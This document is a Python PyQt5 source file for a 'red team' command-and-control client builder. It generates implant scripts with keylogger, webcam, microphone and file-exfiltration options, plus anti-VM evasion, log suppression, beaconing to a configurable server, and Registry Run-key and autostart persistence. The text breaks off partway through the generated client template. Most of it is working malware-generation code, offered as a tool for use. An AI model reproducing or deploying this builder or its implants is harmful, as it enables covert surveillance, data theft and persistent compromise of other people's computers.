#!/usr/bin/env python3
"""
Advanced Red Team C2 Client Builder
-----------------------------------
Professional PyQt5 application to generate customizable C2 client payloads with
advanced red teaming capabilities. Features include persistence, encryption, 
obfuscation, and multiple payload formats for different platforms and scenarios.
Generated payloads are saved to the `downloads/` directory.
"""

import os
import sys
import time
import json
import base64
import platform
from pathlib import Path

from PyQt5 import QtCore, QtWidgets
from PyQt5.QtGui import QIntValidator, QFont
from PyQt5.QtWidgets import QTabWidget, QGridLayout


SUPPORTED_CLIENTS = {
    "Advanced (Cross‑platform)": {
        "module": "advanced_client",
        "class": "AdvancedC2Client",
        "filename_prefix": "advanced",
        "icon": "🌐",
        "description": "Cross-platform client with all capabilities"
    },
    "Windows": {
        "module": "windows_client",
        "class": "WindowsC2Client",
        "filename_prefix": "windows",
        "icon": "🪟",
        "description": "Windows-specific client with Windows features"
    },
    "Linux": {
        "module": "linux_client",
        "class": "LinuxC2Client",
        "filename_prefix": "linux",
        "icon": "🐧",
        "description": "Linux-specific client with Linux features"
    },
    "macOS": {
        "module": "mac_client",
        "class": "MacC2Client",
        "filename_prefix": "mac",
        "icon": "🍎",
        "description": "macOS-specific client with Apple features"
    },
}


class ClientBuilderWindow(QtWidgets.QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Advanced Red Team C2 Client Builder")
        self.setMinimumWidth(700)
        self.setGeometry(100, 100, 750, 800)
        self.setStyleSheet("""
            QWidget {
                font-family: 'Segoe UI', Tahoma, sans-serif;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #4a86e8;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QPushButton {
                background-color: #4a86e8;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #3a76d8;
            }
            QPushButton:pressed {
                background-color: #2a66c8;
            }
            QLineEdit, QComboBox, QTextEdit {
                border: 1px solid #ccc;
                border-radius: 3px;
                padding: 5px;
            }
        """)
        self._build_ui()

    def _build_ui(self):
        layout = QtWidgets.QVBoxLayout(self)
        
        # Title
        title_label = QtWidgets.QLabel("Advanced Red Team C2 Client Builder")
        title_font = QFont()
        title_font.setPointSize(14)
        title_font.setBold(True)
        title_label.setFont(title_font)
        title_label.setAlignment(QtCore.Qt.AlignCenter)
        title_label.setStyleSheet("color: #1a73e8; margin: 10px 0; padding: 10px;")
        layout.addWidget(title_label)

        # Main tabs
        tab_widget = QTabWidget()
        
        # Preset configurations
        PRESETS = {
            "Covert Surveillance": {
                "capabilities": {
                    "screenshot": True,
                    "keylogger": True,
                    "webcam": True,
                    "microphone": True,
                },
                "persistence": {
                    "startup": True,
                    "hidden_file": True,
                },
                "stealth": True,
                "beacon_interval": 60,
                "encryption": "AES-256",
                "output_format": "Executable (PyInstaller)"
            },
            "Data Exfiltration": {
                "capabilities": {
                    "file_exfiltration": True,
                    "screenshot": True,
                    "process_injection": True,
                },
                "persistence": {
                    "cron": True,
                    "startup": True,
                },
                "stealth": True,
                "disable_logging": True,
                "beacon_interval": 45,
                "encryption": "ChaCha20",
                "output_format": "Python Script"
            },
            "Lateral Movement": {
                "capabilities": {
                    "privilege_escalation": True,
                    "process_injection": True,
                    "uac_bypass": True,
                    "network": True,
                },
                "persistence": {
                    "task_scheduler": True,
                    "startup": True,
                },
                "stealth": True,
                "anti_vm": True,
                "beacon_interval": 90,
                "encryption": "AES-256",
                "output_format": "EXE (C++)"
            },
            "Minimal Recon": {
                "capabilities": {
                    "screenshot": True,
                    "processes": True,
                    "network": True,
                },
                "persistence": {},
                "stealth": True,
                "beacon_interval": 120,
                "encryption": "None",
                "output_format": "Python Script"
            }
        }
        
        # Basic Settings Tab
        basic_tab = QtWidgets.QWidget()
        basic_layout = QtWidgets.QVBoxLayout(basic_tab)
        
        # Configuration Presets
        preset_group = QtWidgets.QGroupBox("Configuration Presets")
        preset_layout = QtWidgets.QHBoxLayout(preset_group)
        self.preset_combo = QtWidgets.QComboBox()
        self.preset_combo.addItem("Select a preset...", None)
        for preset_name in PRESETS.keys():
            self.preset_combo.addItem(preset_name)
        self.apply_preset_btn = QtWidgets.QPushButton("Apply Preset")
        preset_layout.addWidget(self.preset_combo)
        preset_layout.addWidget(self.apply_preset_btn)
        basic_layout.addWidget(preset_group)
        
        # Client type
        client_type_group = QtWidgets.QGroupBox("Client Platform")
        ct_layout = QtWidgets.QFormLayout(client_type_group)
        self.client_type_combo = QtWidgets.QComboBox()
        for client_name, client_info in SUPPORTED_CLIENTS.items():
            self.client_type_combo.addItem(f"{client_info['icon']} {client_name}", client_info)
        ct_layout.addRow("Target Platform:", self.client_type_combo)
        basic_layout.addWidget(client_type_group)

        # Server settings
        server_group = QtWidgets.QGroupBox("C2 Server Configuration")
        s_layout = QtWidgets.QFormLayout(server_group)
        self.ip_edit = QtWidgets.QLineEdit("127.0.0.1")
        self.port_edit = QtWidgets.QLineEdit("8000")
        self.port_edit.setValidator(QIntValidator(1, 65535, self))
        self.protocol_combo = QtWidgets.QComboBox()
        self.protocol_combo.addItems(["HTTP", "HTTPS", "WebSocket"])
        self.beacon_interval_spin = QtWidgets.QSpinBox()
        self.beacon_interval_spin.setRange(5, 3600)
        self.beacon_interval_spin.setValue(30)
        self.beacon_interval_spin.setSuffix(" seconds")
        s_layout.addRow("Protocol:", self.protocol_combo)
        s_layout.addRow("Server IP:", self.ip_edit)
        s_layout.addRow("Port:", self.port_edit)
        s_layout.addRow("Beacon Interval:", self.beacon_interval_spin)
        basic_layout.addWidget(server_group)

        # Client identification
        client_group = QtWidgets.QGroupBox("Client Identification")
        c_layout = QtWidgets.QFormLayout(client_group)
        self.client_id_edit = QtWidgets.QLineEdit()
        self.client_id_edit.setPlaceholderText("Optional. Autogenerated if empty.")
        self.display_name_edit = QtWidgets.QLineEdit()
        self.display_name_edit.setPlaceholderText("Optional display name for the client")
        c_layout.addRow("Client ID:", self.client_id_edit)
        c_layout.addRow("Display Name:", self.display_name_edit)
        basic_layout.addWidget(client_group)
        
        tab_widget.addTab(basic_tab, "Basic Settings")

        # Advanced Features Tab
        advanced_tab = QtWidgets.QWidget()
        advanced_layout = QtWidgets.QVBoxLayout(advanced_tab)
        
        # Capabilities
        capabilities_group = QtWidgets.QGroupBox("Payload Capabilities")
        cap_layout = QtWidgets.QGridLayout(capabilities_group)
        self.screenshot_checkbox = QtWidgets.QCheckBox("Screenshot Capture")
        self.keylogger_checkbox = QtWidgets.QCheckBox("Keylogger")
        self.file_exfiltration_checkbox = QtWidgets.QCheckBox("File Exfiltration")
        self.webcam_checkbox = QtWidgets.QCheckBox("Webcam Access")
        self.microphone_checkbox = QtWidgets.QCheckBox("Microphone Access") 
        self.privilege_escalation_checkbox = QtWidgets.QCheckBox("Privilege Escalation")
        self.process_injection_checkbox = QtWidgets.QCheckBox("Process Injection")
        self.uac_bypass_checkbox = QtWidgets.QCheckBox("UAC Bypass (Windows)")
        self.dns_tunneling_checkbox = QtWidgets.QCheckBox("DNS Tunneling")
        
        # Arrange capabilities in 2 columns
        cap_layout.addWidget(self.screenshot_checkbox, 0, 0)
        cap_layout.addWidget(self.keylogger_checkbox, 0, 1)
        cap_layout.addWidget(self.file_exfiltration_checkbox, 1, 0)
        cap_layout.addWidget(self.webcam_checkbox, 1, 1)
        cap_layout.addWidget(self.microphone_checkbox, 2, 0)
        cap_layout.addWidget(self.privilege_escalation_checkbox, 2, 1)
        cap_layout.addWidget(self.process_injection_checkbox, 3, 0)
        cap_layout.addWidget(self.uac_bypass_checkbox, 3, 1)
        cap_layout.addWidget(self.dns_tunneling_checkbox, 4, 0)
        
        advanced_layout.addWidget(capabilities_group)

        # Stealth Options
        stealth_group = QtWidgets.QGroupBox("Stealth & Evasion")
        stealth_layout = QtWidgets.QVBoxLayout(stealth_group)
        self.stealth_checkbox = QtWidgets.QCheckBox("Enable Stealth Mode (reduced console output)")
        self.hide_console_checkbox = QtWidgets.QCheckBox("Hide Console Window (Windows)")
        self.disable_logging_checkbox = QtWidgets.QCheckBox("Disable System Logging")
        self.anti_vm_checkbox = QtWidgets.QCheckBox("Anti-VM/Anti-Analysis Evasion")
        self.integrity_check_checkbox = QtWidgets.QCheckBox("Integrity Check Bypass")
        stealth_layout.addWidget(self.stealth_checkbox)
        stealth_layout.addWidget(self.hide_console_checkbox)
        stealth_layout.addWidget(self.disable_logging_checkbox)
        stealth_layout.addWidget(self.anti_vm_checkbox)
        stealth_layout.addWidget(self.integrity_check_checkbox)
        advanced_layout.addWidget(stealth_group)

        # Network Options
        network_group = QtWidgets.QGroupBox("Network Configuration")
        net_layout = QtWidgets.QFormLayout(network_group)
        self.proxy_host_edit = QtWidgets.QLineEdit()
        self.proxy_port_edit = QtWidgets.QLineEdit()
        self.proxy_port_edit.setValidator(QIntValidator(1, 65535, self))
        self.user_agent_edit = QtWidgets.QLineEdit("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        self.custom_headers_text = QtWidgets.QTextEdit()
        self.custom_headers_text.setMaximumHeight(80)
        self.custom_headers_text.setPlaceholderText("Custom HTTP headers (JSON format)\nExample: {\"X-Custom\": \"value\"}")
        net_layout.addRow("Proxy Host:", self.proxy_host_edit)
        net_layout.addRow("Proxy Port:", self.proxy_port_edit)
        net_layout.addRow("User-Agent:", self.user_agent_edit)
        net_layout.addRow("Custom Headers:", self.custom_headers_text)
        advanced_layout.addWidget(network_group)
        
        tab_widget.addTab(advanced_tab, "Advanced Features")

        # Persistence & Obfuscation Tab
        persistence_tab = QtWidgets.QWidget()
        persistence_layout = QtWidgets.QVBoxLayout(persistence_tab)
        
        # Persistence Options
        persistence_group = QtWidgets.QGroupBox("Persistence Mechanisms")
        persist_layout = QtWidgets.QGridLayout(persistence_group)
        self.startup_checkbox = QtWidgets.QCheckBox("Add to Startup (Registry/Startup folder)")
        self.service_checkbox = QtWidgets.QCheckBox("Install as Service (Windows)")
        self.cron_checkbox = QtWidgets.QCheckBox("Add to Cron (Linux)")
        self.launch_agent_checkbox = QtWidgets.QCheckBox("Add as Launch Agent (macOS)")
        self.task_scheduler_checkbox = QtWidgets.QCheckBox("Use Task Scheduler (Windows)")
        self.hidden_file_checkbox = QtWidgets.QCheckBox("Hide in System Files")
        
        persist_layout.addWidget(self.startup_checkbox, 0, 0)
        persist_layout.addWidget(self.service_checkbox, 0, 1)
        persist_layout.addWidget(self.cron_checkbox, 1, 0)
        persist_layout.addWidget(self.launch_agent_checkbox, 1, 1)
        persist_layout.addWidget(self.task_scheduler_checkbox, 2, 0)
        persist_layout.addWidget(self.hidden_file_checkbox, 2, 1)
        persistence_layout.addWidget(persistence_group)

        # Encryption & Obfuscation
        enc_group = QtWidgets.QGroupBox("Encryption & Obfuscation")
        enc_layout = QtWidgets.QFormLayout(enc_group)
        self.encryption_combo = QtWidgets.QComboBox()
        self.encryption_combo.addItems(["None", "AES-256", "ChaCha20", "Custom"])
        self.encryption_key_edit = QtWidgets.QLineEdit()
        self.encryption_key_edit.setPlaceholderText("Leave empty to auto-generate")
        self.obfuscation_checkbox = QtWidgets.QCheckBox("Obfuscate Payload")
        self.string_enc_checkbox = QtWidgets.QCheckBox("Encrypt Strings")
        self.junk_code_checkbox = QtWidgets.QCheckBox("Add Junk Code")
        enc_layout.addRow("Encryption Algorithm:", self.encryption_combo)
        enc_layout.addRow("Encryption Key:", self.encryption_key_edit)
        enc_layout.addRow(self.obfuscation_checkbox)
        enc_layout.addRow(self.string_enc_checkbox)
        enc_layout.addRow(self.junk_code_checkbox)
        persistence_layout.addWidget(enc_group)

        # Output Options
        output_group = QtWidgets.QGroupBox("Output Configuration")
        out_layout = QtWidgets.QFormLayout(output_group)
        self.output_format_combo = QtWidgets.QComboBox()
        self.output_format_combo.addItems(["Python Script", "Executable (PyInstaller)", "DLL", "EXE (C++)", "HTA", "VBS", "JS"])
        self.compression_checkbox = QtWidgets.QCheckBox("Compress Payload")
        self.packing_checkbox = QtWidgets.QCheckBox("Pack with UPX (EXE)")
        self.icon_path_edit = QtWidgets.QLineEdit()
        self.icon_browse_btn = QtWidgets.QPushButton("Browse Icon...")
        icon_row = QtWidgets.QHBoxLayout()
        icon_row.addWidget(self.icon_path_edit)
        icon_row.addWidget(self.icon_browse_btn)
        out_layout.addRow("Output Format:", self.output_format_combo)
        out_layout.addRow("Compression:", self.compression_checkbox)
        out_layout.addRow("UPX Packing:", self.packing_checkbox)
        out_layout.addRow("Custom Icon:", self._wrap_layout_widget(icon_row))
        persistence_layout.addWidget(output_group)
        
        tab_widget.addTab(persistence_tab, "Persistence & Obfuscation")
        
        # Add Command Generation tab
        cmd_generation_tab = QtWidgets.QWidget()
        cmd_layout = QtWidgets.QVBoxLayout(cmd_generation_tab)
        
        # Command Preview
        cmd_preview_group = QtWidgets.QGroupBox("Generated Command")
        cmd_preview_layout = QtWidgets.QVBoxLayout(cmd_preview_group)
        self.cmd_preview_text = QtWidgets.QTextEdit()
        self.cmd_preview_text.setReadOnly(True)
        self.cmd_preview_text.setMaximumHeight(150)
        self.update_cmd_btn = QtWidgets.QPushButton("Update Command Preview")
        cmd_preview_layout.addWidget(self.cmd_preview_text)
        cmd_preview_layout.addWidget(self.update_cmd_btn)
        cmd_layout.addWidget(cmd_preview_group)
        
        # Command Generation Options
        cmd_options_group = QtWidgets.QGroupBox("Command Generation Options")
        cmd_options_layout = QtWidgets.QFormLayout(cmd_options_group)
        self.cmd_format_combo = QtWidgets.QComboBox()
        self.cmd_format_combo.addItems(["Python", "PyInstaller", "Windows Batch", "Linux Shell"])
        self.include_deps_checkbox = QtWidgets.QCheckBox("Include dependencies in command")
        cmd_options_layout.addRow("Command Format:", self.cmd_format_combo)
        cmd_options_layout.addRow(self.include_deps_checkbox)
        cmd_layout.addWidget(cmd_options_group)
        
        tab_widget.addTab(cmd_generation_tab, "Command Generation")

        layout.addWidget(tab_widget)

        # Output directory
        out_group = QtWidgets.QGroupBox("Output Directory")
        o_layout = QtWidgets.QFormLayout(out_group)
        self.output_dir_edit = QtWidgets.QLineEdit(str(Path("downloads").resolve()))
        self.browse_btn = QtWidgets.QPushButton("Browse…")
        browse_row = QtWidgets.QHBoxLayout()
        browse_row.addWidget(self.output_dir_edit)
        browse_row.addWidget(self.browse_btn)
        o_layout.addRow("Save to:", self._wrap_layout_widget(browse_row))
        layout.addWidget(out_group)

        # Generate button + status
        self.generate_btn = QtWidgets.QPushButton("Generate Advanced C2 Client")
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #0f9d58;
                font-size: 12pt;
                padding: 12px;
            }
            QPushButton:hover {
                background-color: #0d8a4a;
            }
        """)
        self.status_label = QtWidgets.QLabel("")
        self.status_label.setWordWrap(True)
        self.status_label.setStyleSheet("padding: 10px; background-color: #f8f9fa; border: 1px solid #e0e0e0;")
        layout.addWidget(self.generate_btn)
        layout.addWidget(self.status_label)

        # Signals
        self.browse_btn.clicked.connect(self._browse_output_dir)
        self.icon_browse_btn.clicked.connect(self._browse_icon)
        self.generate_btn.clicked.connect(self._on_generate)
        self.apply_preset_btn.clicked.connect(self._apply_preset)
        self.update_cmd_btn.clicked.connect(self._update_command_preview)
        # Update command preview when important fields change
        self.client_type_combo.currentIndexChanged.connect(self._update_command_preview)
        self.ip_edit.textChanged.connect(self._update_command_preview)
        self.port_edit.textChanged.connect(self._update_command_preview)
        self.client_id_edit.textChanged.connect(self._update_command_preview)

    @staticmethod
    def _wrap_layout_widget(layout: QtWidgets.QLayout) -> QtWidgets.QWidget:
        w = QtWidgets.QWidget()
        w.setLayout(layout)
        return w

    def _browse_output_dir(self):
        directory = QtWidgets.QFileDialog.getExistingDirectory(self, "Select output directory", self.output_dir_edit.text())
        if directory:
            self.output_dir_edit.setText(directory)
    
    def _browse_icon(self):
        file_path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self, 
            "Select Icon File", 
            "", 
            "Icon Files (*.ico *.exe *.dll);;All Files (*)"
        )
        if file_path:
            self.icon_path_edit.setText(file_path)

    def _validate(self):
        ip = self.ip_edit.text().strip()
        port_text = self.port_edit.text().strip()
        if not ip:
            return False, "Server IP is required."
        if not port_text.isdigit():
            return False, "Port must be a number."
        port = int(port_text)
        if port < 1 or port > 65535:
            return False, "Port must be between 1 and 65535."
        out_dir = self.output_dir_edit.text().strip()
        if not out_dir:
            return False, "Output directory is required."
        
        # Validate encryption key if custom encryption is selected
        if self.encryption_combo.currentText() == "Custom" and not self.encryption_key_edit.text().strip():
            return False, "Encryption key is required when using custom encryption."
            
        return True, ""

    def _on_generate(self):
        ok, err = self._validate()
        if not ok:
            self._set_status(err, error=True)
            return

        client_info = self.client_type_combo.currentData()
        client_meta = SUPPORTED_CLIENTS[self.client_type_combo.currentText().split(' ', 1)[1]]  # Extract the actual client name

        # Get protocol and build server URL
        protocol = self.protocol_combo.currentText().lower()
        ip = self.ip_edit.text().strip()
        port = int(self.port_edit.text().strip())
        server_url = "{}://{}:{}".format(protocol, ip, port)

        # Client configuration
        client_id = self.client_id_edit.text().strip() or ""
        display_name = self.display_name_edit.text().strip() or ""
        beacon_interval = self.beacon_interval_spin.value()
        stealth = self.stealth_checkbox.isChecked()
        hide_console = self.hide_console_checkbox.isChecked()
        disable_logging = self.disable_logging_checkbox.isChecked()
        anti_vm = self.anti_vm_checkbox.isChecked()
        encryption = self.encryption_combo.currentText()
        encryption_key = self.encryption_key_edit.text().strip()
        obfuscation = self.obfuscation_checkbox.isChecked()
        output_format = self.output_format_combo.currentText()
        
        # Get proxy settings if provided
        proxy_host = self.proxy_host_edit.text().strip() if self.proxy_host_edit.text().strip() else None
        proxy_port = int(self.proxy_port_edit.text().strip()) if self.proxy_port_edit.text().strip() else None
        user_agent = self.user_agent_edit.text().strip()
        
        # Parse custom headers
        custom_headers = {}
        if self.custom_headers_text.toPlainText().strip():
            try:
                custom_headers = json.loads(self.custom_headers_text.toPlainText())
            except json.JSONDecodeError:
                self._set_status("Invalid JSON in custom headers", error=True)
                return

        # Capabilities
        capabilities = {
            "screenshot": self.screenshot_checkbox.isChecked(),
            "keylogger": self.keylogger_checkbox.isChecked(),
            "file_exfiltration": self.file_exfiltration_checkbox.isChecked(),
            "webcam": self.webcam_checkbox.isChecked(),
            "microphone": self.microphone_checkbox.isChecked(),
            "privilege_escalation": self.privilege_escalation_checkbox.isChecked(),
            "process_injection": self.process_injection_checkbox.isChecked(),
            "uac_bypass": self.uac_bypass_checkbox.isChecked(),
            "dns_tunneling": self.dns_tunneling_checkbox.isChecked(),
        }

        # Persistence mechanisms
        persistence = {
            "startup": self.startup_checkbox.isChecked(),
            "service": self.service_checkbox.isChecked(),
            "cron": self.cron_checkbox.isChecked(),
            "launch_agent": self.launch_agent_checkbox.isChecked(),
            "task_scheduler": self.task_scheduler_checkbox.isChecked(),
            "hidden_file": self.hidden_file_checkbox.isChecked(),
        }

        output_dir = Path(self.output_dir_edit.text().strip())
        try:
            output_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            self._set_status("Failed to create output directory: {}".format(e), error=True)
            return

        # Determine file extension based on output format
        import platform  # Import here to avoid issues when running the client builder
        
        extension_map = {
            "Python Script": ".py",
            "Executable (PyInstaller)": ".exe" if platform.system() == "Windows" else (".app" if platform.system() == "Darwin" else ".bin"),
            "DLL": ".dll",
            "EXE (C++)": ".exe" if platform.system() == "Windows" else (".app" if platform.system() == "Darwin" else ".bin"),
            "HTA": ".hta",
            "VBS": ".vbs",
            "JS": ".js"
        }
        # If Python Script is selected, always use .py regardless of platform
        if output_format == "Python Script":
            extension = ".py"
        else:
            extension = extension_map.get(output_format, ".py")
        
        filename = self._make_filename(client_meta["filename_prefix"], client_id, extension)
        target_path = output_dir / filename

        try:
            content = self._generate_launcher_source(
                module_name=client_meta["module"],
                class_name=client_meta["class"],
                server_url=server_url,
                client_id=client_id,
                display_name=display_name,
                beacon_interval=beacon_interval,
                stealth=stealth,
                hide_console=hide_console,
                disable_logging=disable_logging,
                anti_vm=anti_vm,
                capabilities=capabilities,
                persistence=persistence,
                encryption=encryption,
                encryption_key=encryption_key,
                obfuscation=obfuscation,
                proxy_host=proxy_host,
                proxy_port=proxy_port,
                user_agent=user_agent,
                custom_headers=custom_headers
            )
            target_path.write_text(content, encoding="utf-8")
            try:
                os.chmod(str(target_path), 0o755)
            except Exception:
                pass
        except Exception as e:
            self._set_status("Failed to write script: {}".format(e), error=True)
            return

        self._set_status("✅ Advanced C2 Client Generated: {}".format(str(target_path)))
        
        # Log the configuration used
        config_log = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "client_type": client_meta["filename_prefix"],
            "server_url": server_url,
            "client_id": client_id,
            "beacon_interval": beacon_interval,
            "capabilities": capabilities,
            "persistence": persistence,
            "encryption": encryption,
            "output_format": output_format
        }
        config_path = output_dir / "client_config.json"
        try:
            existing_configs = []
            if config_path.exists():
                with open(config_path, 'r') as f:
                    existing_configs = json.load(f)
            existing_configs.append(config_log)
            with open(config_path, 'w') as f:
                json.dump(existing_configs, f, indent=2)
        except Exception as e:
            self._set_status(f"Warning: Could not save configuration log: {e}")

    @staticmethod
    def _make_filename(prefix: str, client_id: str, extension: str = ".py") -> str:
        safe_id = client_id if client_id else time.strftime("%Y%m%d_%H%M%S")
        return "advanced_client_{}_{}{}".format(prefix, safe_id, extension)

    @staticmethod
    def _generate_launcher_source(module_name: str, class_name: str, server_url: str, client_id: str, 
                                  display_name: str, beacon_interval: int, stealth: bool, hide_console: bool, 
                                  disable_logging: bool, anti_vm: bool, capabilities: dict, 
                                  persistence: dict, encryption: str, encryption_key: str, 
                                  obfuscation: bool, proxy_host: str, proxy_port: int, 
                                  user_agent: str, custom_headers: dict) -> str:
        # Create a self-contained client script
        client_script = f'''#!/usr/bin/env python3
# Advanced Red Team C2 Client - Self-contained
# Generated on: {time.strftime("%Y-%m-%d %H:%M:%S")}
import sys
import os
import time
import json
import requests
import platform
import socket
import subprocess
import threading
import uuid
import base64
import psutil
import logging
from datetime import datetime
import tempfile
import shutil
import getpass

class AdvancedC2Client:
    def __init__(self, server_url="http://localhost:8000", 
                 client_id=None, display_name=None, beacon_interval=30,
                 stealth_mode=False, hide_console=False, disable_logging=False,
                 anti_vm_evasion=False, capabilities=None, persistence=None,
                 encryption="None", encryption_key=None, proxy_host=None,
                 proxy_port=None, user_agent=None, custom_headers=None):
        self.server_url = server_url
        self.client_id = client_id or "client_{{}}".format(uuid.uuid4().hex[:8])
        self.display_name = display_name
        self.beacon_interval = beacon_interval
        self.session = requests.Session()
        self.running = False
        self.stealth_mode = stealth_mode
        self.hide_console = hide_console
        self.disable_logging = disable_logging
        self.anti_vm_evasion = anti_vm_evasion
        self.capabilities = capabilities or {{}}
        self.persistence = persistence or {{}}
        self.encryption = encryption
        self.encryption_key = encryption_key
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.custom_headers = custom_headers or {{}}
        
        # Keylogger attributes
        self.keylogger_active = False
        self.keylogger_thread = None
        self.logged_keys = []
        
        # Setup logging
        self.setup_logging()
        
        # Create temp directory for client operations
        self.temp_dir = tempfile.mkdtemp(prefix="c2_client_")
        self.logger.info("Client temp directory: {{}}".format(self.temp_dir))
        
        # Apply proxy settings if provided
        if self.proxy_host and self.proxy_port:
            proxy_url = f"http://{{self.proxy_host}}:{{self.proxy_port}}"
            self.session.proxies = {{
                'http': proxy_url,
                'https': proxy_url
            }}
        
        # Apply custom headers
        self.session.headers.update({{
            'User-Agent': self.user_agent,
            **self.custom_headers
        }})
        
        # Apply encryption if enabled
        if self.encryption != "None":
            self.setup_encryption()
    
    def setup_encryption(self):
        """Setup encryption for communications"""
        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            
            if self.encryption_key:
                password = self.encryption_key.encode()
            else:
                # Generate a default key based on client ID
                password = self.client_id.encode()
            
            # Use a fixed salt for simplicity (in production, use a random salt stored securely)
            salt = b'salt_32_bytes_long_for_pbkdf2_hmac'
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))
            self.cipher = Fernet(key)
        except ImportError:
            self.logger.warning("Encryption requested but 'cryptography' module not available")
            self.cipher = None
        except Exception as e:
            self.logger.error(f"Error setting up encryption: {{e}}")
            self.cipher = None
    
    def encrypt_data(self, data):
        """Encrypt data if encryption is enabled"""
        if self.cipher and isinstance(data, (str, bytes)):
            if isinstance(data, str):
                data = data.encode()
            return self.cipher.encrypt(data).decode()
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if encryption is enabled"""
        if self.cipher and isinstance(data, (str, bytes)):
            if isinstance(data, str):
                data = data.encode()
            try:
                return self.cipher.decrypt(data).decode()
            except Exception:
                return data.decode() if isinstance(data, bytes) else data
        return data
    
    def setup_logging(self):
        """Setup logging for the client"""
        log_level = logging.WARNING if self.disable_logging else logging.INFO
        
        log_file = os.path.join(self.temp_dir, "client.log") if hasattr(self, 'temp_dir') else "client.log"
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def check_vm_evasion(self):
        """Check for virtualization environments and exit if detected"""
        if not self.anti_vm_evasion:
            return False
            
        try:
            # Common VM indicators
            vm_indicators = [
                # Check if running in VM by looking for VM-specific processes
                any(vm_name in platform.platform().lower() for vm_name in ['virtualbox', 'vmware', 'hyperv', 'xen']),
                # Check for VM-specific hardware
                'virtual' in platform.platform().lower(),
                # Check for VM-specific MAC addresses
                any(vm_mac in ':'.join(['{{:02x}}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,2*6,2)][::-1]).lower() 
                    for vm_mac in ['08:00:27', '00:05:69', '00:0c:29', '00:1c:42', '00:50:56']),
                # Check for VM processes (Windows)
                platform.system() == "Windows" and any([
                    subprocess.run(['tasklist'], capture_output=True, text=True).stdout.lower().count('vboxservice') > 0,
                    subprocess.run(['tasklist'], capture_output=True, text=True).stdout.lower().count('vmware') > 0,
                ])
            ]
            
            if any(vm_indicators):
                self.logger.warning("Virtual environment detected, exiting for evasion")
                return True
        except Exception:
            pass  # If checking fails, continue normally
            
        return False
    
    def get_system_info(self):
        """Get comprehensive system information"""
        try:
            hostname = socket.gethostname()
            username = getpass.getuser()
            os_info = "{{}} {{}} {{}}".format(platform.system(), platform.release(), platform.version())
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            
            # Get additional system info
            cpu_count = psutil.cpu_count()
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            system_info = {{
                "agent_id": self.client_id,
                "display_name": self.display_name or self.client_id,
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "cpu_count": cpu_count,
                "memory_total": memory.total,
                "memory_available": memory.available,
                "disk_total": disk.total,
                "disk_free": disk.free,
                "python_version": sys.version,
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "boot_time": psutil.boot_time(),
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "capabilities": self.capabilities
            }}
            
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {{}}".format(e))
            return None
    
    def install_persistence(self):
        """Install various persistence mechanisms based on configuration"""
        if not self.persistence:
            return True
            
        success_count = 0
        total_attempts = 0
        
        # Startup persistence (Windows/Linux/macOS)
        if self.persistence.get("startup", False):
            total_attempts += 1
            if self._install_startup_persistence():
                success_count += 1
        
        # Service persistence (Windows)
        if self.persistence.get("service", False) and platform.system() == "Windows":
            total_attempts += 1
            if self._install_service_persistence():
                success_count += 1
        
        # Cron job persistence (Linux)
        if self.persistence.get("cron", False) and platform.system() == "Linux":
            total_attempts += 1
            if self._install_cron_persistence():
                success_count += 1
        
        # Launch Agent persistence (macOS)
        if self.persistence.get("launch_agent", False) and platform.system() == "Darwin":
            total_attempts += 1
            if self._install_launch_agent_persistence():
                success_count += 1
        
        # Task Scheduler persistence (Windows)
        if self.persistence.get("task_scheduler", False) and platform.system() == "Windows":
            total_attempts += 1
            if self._install_task_scheduler_persistence():
                success_count += 1
        
        # Hidden file persistence
        if self.persistence.get("hidden_file", False):
            total_attempts += 1
            if self._install_hidden_file_persistence():
                success_count += 1
        
        # Report results
        if total_attempts > 0:
            self.logger.info(f"Installed {{success_count}}/{{total_attempts}} persistence mechanisms")
            return success_count > 0
        else:
            return True
    
    def _install_startup_persistence(self):
        """Install startup persistence mechanism"""
        try:
            if platform.system() == "Windows":
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "C2Client", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
                return True
            elif platform.system() == "Linux":
                startup_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(startup_dir, exist_ok=True)
                
                # Create a desktop entry
                desktop_entry = f"""[Desktop Entry]
Type=Application
Name=C2Client
Exec=python3 {{os.path.abspath(__file__)}}
Hidden=false
